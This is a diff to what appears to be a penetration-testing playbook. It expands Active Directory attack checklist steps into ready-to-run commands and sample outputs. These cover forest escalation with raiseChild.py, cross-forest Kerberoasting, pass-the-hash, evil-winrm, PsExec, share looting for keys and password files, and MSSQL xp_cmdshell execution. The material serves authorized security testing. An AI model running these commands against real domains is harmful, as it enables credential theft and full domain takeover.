@@ -822,19 +822,51 @@ GPP_PASS  Found groups.xml -> user: svc_deploy  password: Summer2022!
 
 {% stepper %}
 {% step %}
-create a snapshot of the AD database with AD explorer for offline analysis
+#### AD Explorer Snapshot
+
+Snapshot the AD database with Sysinternals AD Explorer for offline, point-in-time analysis.
+
+<mark style="color:$primary;">**What to look for:**</mark> take the snapshot early; later, diff snapshots to spot changes, or browse objects/attributes offline without hammering the DC.
+
+<mark style="color:$primary;">**Next:**</mark> mine the snapshot for attributes other tools skipped (e.g. `userPassword`, custom attributes).
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-use PingCastle to discover additional AD misconfigurations and vulnerabilities
+#### PingCastle
+
+Run PingCastle for a broad misconfiguration sweep and risk score.
+
+<mark style="color:$primary;">**What to look for:**</mark> the HTML report's high-risk findings (stale admins, delegation, trust issues) and the overall maturity score.
+
+<mark style="color:$primary;">**Next:**</mark> turn each high-risk finding into a concrete attack or a report recommendation.
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-run group3r to uncover vulnerabilities in AD Group Policy.
+#### Group3r
+
+Run Group3r to find vulnerabilities inside Group Policy objects.
+
+<mark style="color:$primary;">**What to look for:**</mark> GPO findings - scheduled tasks, mapped drives with creds, privilege assignments.
+
+<mark style="color:$primary;">**Next:**</mark> chase any GPO you can write to, or any cred a GPO leaks.
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-Run ADRecon.ps1 to disocver additional AD misconfigurations and vulnerabilties that may have been missed.
+#### ADRecon
+
+Run `ADRecon.ps1` for a broad report of AD config and anything missed elsewhere.
+
+<mark style="color:$primary;">**What to look for:**</mark> the Excel report's sheets on users, computers, SPNs, and delegation.
+
+<mark style="color:$primary;">**Next:**</mark> reconcile against BloodHound to catch gaps.
+
+* [ ] Complete
 {% endstep %}
 {% endstepper %}
 
@@ -842,23 +874,45 @@ Run ADRecon.ps1 to disocver additional AD misconfigurations and vulnerabilties t
 
 {% stepper %}
 {% step %}
-Discover any current domain trusts with other domains using Get-ADTrust, Get-DomainTrust (PowerView) or Bloodhound.
+#### Discover Trusts
+
+Enumerate trusts with [powerview.md](../toolbox/tooling/post-exploitation/powersploit/powerview.md "mention") / [bloodhound](../toolbox/tooling/information-gathering/windows-enumeration/domain-enumeration/bloodhound/ "mention"). See [domain-trust-abuse.md](../field-manual/exploitation/initial-access/domain-trust-abuse.md "mention").
+
+```bash
+nxc ldap <dc-ip> -u user -p 'pass' -M enum_trusts
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> trust partner, **direction**, and whether it's within the forest (SID history/ExtraSID applies) or cross-forest.
+
+```
+Source: child.domain.local  Target: domain.local  Direction: Bidirectional  Type: ParentChild
+```
+
+<mark style="color:$primary;">**Next:**</mark> ParentChild + DA in the child > ExtraSID attack (next step).
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-From a machine with Domain Admin privileges, attempt an ExtraSIDs attack to create an Enterprise admin user in the parent domain.
-{% endstep %}
+#### ExtraSID (Child → Parent)
 
-{% step %}
-Domain trusts overview
-{% endstep %}
+From DA in a child domain, forge a golden ticket carrying the Enterprise Admins SID to own the forest root. See golden-ticket-silver-ticket-attacks.
 
-{% step %}
-child > parent attacks Windows
-{% endstep %}
+```bash
+raiseChild.py -target-exec <parent-dc> child.domain.local/childadmin:'pass'
+```
 
-{% step %}
-child > parent attacks Linux
+<mark style="color:$primary;">**What to look for:**</mark> the script dumping the parent domain's `Administrator`/`krbtgt` after escalation.
+
+```
+[*] Target user is Administrator
+[*] Dumping Domain Credentials (domain.local)
+Administrator:500:aad3b...:...
+```
+
+<mark style="color:$primary;">**Next:**</mark> you now hold forest-root creds - confirm with `nxc smb <parent-dc> -u Administrator -H <hash>`.
+
+* [ ] Complete
 {% endstep %}
 {% endstepper %}
 
@@ -866,27 +920,61 @@ child > parent attacks Linux
 
 {% stepper %}
 {% step %}
-Discover any current domain trusts with other domains using Get-ADTrust, Get-DomainTrust (powerview) or bloodhound
+#### Discover Trusts
+
+Enumerate trusts and note the direction (cross-forest trusts have SID filtering, so ExtraSID won't work). Use [powerview.md](../toolbox/tooling/post-exploitation/powersploit/powerview.md "mention") or [bloodhound](../toolbox/tooling/information-gathering/windows-enumeration/domain-enumeration/bloodhound/ "mention").
+
+<mark style="color:$primary;">**What to look for:**</mark> `Type: Forest` / external trusts and their direction.
+
+<mark style="color:$primary;">**Next:**</mark> pursue cross-forest Kerberoasting and credential reuse (below) rather than SID-history.
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-Attempt cross-forsest kerberoasting
+#### Cross-Forest Kerberoasting
+
+Request SPN tickets across the trust and crack offline.
+
+{% code overflow="wrap" %}
+```bash
+impacket-GetUserSPNs domain.local/user:'pass' -target-domain <foreign.forest> -request
+```
+{% endcode %}
+
+<mark style="color:$primary;">**What to look for:**</mark> `$krb5tgs$` hashes from the foreign forest.
+
+<mark style="color:$primary;">**Next:**</mark> crack (`hashcat -m 13100`); a cracked foreign service account is a foothold in the other forest.
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-if admin accounts sharee names across domains, and on is compromsied, try credential reuse.
+#### Credential Reuse
+
+If admin accounts share names across domains and one is compromised, test reuse against the trusted domain.
+
+```bash
+nxc smb <foreign-dc> -u Administrator -H <nthash>
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> a `[+]` / `(Pwn3d!)` against the foreign DC.
+
+<mark style="color:$primary;">**Next:**</mark> on success, enumerate the foreign domain from scratch.
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-Check for SIDHistory abuse.
-{% endstep %}
+#### SID-History Abuse
 
-{% step %}
-cross-forest trust abuse - windows
-{% endstep %}
+Where SID filtering is absent, inherit privileged access via SID history across the trust.
 
-{% step %}
-crossforst trust abuse - linux.
+<mark style="color:$primary;">**What to look for:**</mark> trusts configured without SID filtering (quarantine disabled).
+
+<mark style="color:$primary;">**Next:**</mark> inject the target domain's privileged SID into a ticket to access its resources.
+
+* [ ] Complete
 {% endstep %}
 {% endstepper %}
 
@@ -896,18 +984,71 @@ crossforst trust abuse - linux.
 
 {% stepper %}
 {% step %}
-Access a host via RDP or WinRM as a local user or a local admin.
+#### Interactive Access (RDP / WinRM)
+
+Access a host via RDP or [evil-winrm.md](../toolbox/tooling/post-exploitation/evil-winrm.md "mention").
+
+```bash
+evil-winrm -i <target> -u user -p 'pass'
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> a shell prompt (`*Evil-WinRM* PS C:\>`), then confirm context with `whoami /all`.
+
+<mark style="color:$primary;">**Next:**</mark> run local enumeration (> Windows PrivEsc playbook) or loot for creds.
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-Authenticate to a remote host as an admin using tools such as PsExec.
+#### Admin Authentication (PsExec / PtH)
+
+Authenticate as admin with [psexec.md](../toolbox/tooling/post-exploitation/psexec.md "mention"), or pass-the-hash if you hold an NThash. See [pass-the-hash-overpass-the-hash.md](../field-manual/exploitation/initial-access/pass-the-hash-overpass-the-hash.md "mention").
+
+```bash
+impacket-psexec domain.local/user:'pass'@<target>
+nxc smb <target> -u Administrator -H <nthash> -x "whoami"
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> a SYSTEM shell (PsExec) or `(Pwn3d!)` / command output (nxc PtH).
+
+```
+nt authority\system
+```
+
+<mark style="color:$primary;">**Next:**</mark> dump credentials on the new host and repeat the cycle outward.
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-Gain access to a sensitive file share.
+#### Sensitive File Share Access
+
+Access a sensitive share and loot it.
+
+```bash
+smbclient //<target>/share -U 'domain.local\user%pass'
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> config files, scripts, backups, `.kdbx`, `.ppk`/`id_rsa`, and anything with "pass" in the name.
+
+<mark style="color:$primary;">**Next:**</mark> feed recovered creds/keys back into the credentialed flow.
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-Gain MSSQL access to a host as a DBA user, which can then be leveraged to escalate permissions.
+#### MSSQL as DBA
+
+Gain MSSQL access as a DBA and leverage it for execution.
+
+```bash
+impacket-mssqlclient domain.local/user:'pass'@<target> -windows-auth
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> a SQL prompt; check your role with `SELECT IS_SRVROLEMEMBER('sysadmin');` (returns `1` if DBA).
+
+<mark style="color:$primary;">**Next:**</mark> as sysadmin, enable and use `xp_cmdshell` for OS command execution, or relay/impersonate for lateral movement.
+
+* [ ] Complete
 {% endstep %}
 {% endstepper %}
